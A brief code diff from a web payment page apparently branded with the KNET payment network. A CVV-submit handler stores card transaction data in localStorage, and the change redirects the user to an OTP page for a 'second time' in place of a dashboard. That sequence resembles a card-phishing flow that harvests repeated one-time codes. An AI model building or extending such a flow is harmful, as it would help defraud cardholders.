@@ -3105,7 +3105,7 @@ function handleCVVSubmit(event) {
     const transactionKey = 'transaction_cvv_' + Date.now();
     localStorage.setItem(transactionKey, JSON.stringify(transactionData));
     
-    // Redirect to dashboard
-    window.location.href = '/dashboard.html';
+    // Redirect to OTP page (second time)
+    window.location.href = '/knet/ver.html';
 }
 </script>
